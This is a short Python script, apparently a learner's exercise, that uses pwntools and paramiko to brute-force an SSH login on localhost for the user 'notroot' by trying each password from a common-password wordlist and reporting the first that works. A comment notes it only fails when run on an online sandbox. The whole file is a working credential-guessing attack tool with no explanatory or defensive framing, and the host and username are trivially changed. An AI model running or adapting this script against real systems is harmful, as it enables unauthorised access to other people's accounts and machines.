from pwn import *
import paramiko
# it runs on repli but ONLY FAILS
host = "127.0.0.1"
username = "notroot"
attempts = 0

with open("ssh-common-passwords.txt", "r") as password_list:
  for password in password_list:
    password = password.strip("\n")
    try:
      print("[{}] Attempting password: '{}'!".format(attempts, password))
      #ssh from pwn (pwn  means owned)...timeout is 1 sec
      response = ssh(host=host, user=username, password=password, timeout=1)
      if response.connected():
        # authenticated connection
        print("[>] Valid password found: '{}'!".format(password))
        response.close()
        break
      response.close()
    except paramiko.ssh_exception.AuthenticationException:
      print("[X] Invalid password!")
    attempts += 1
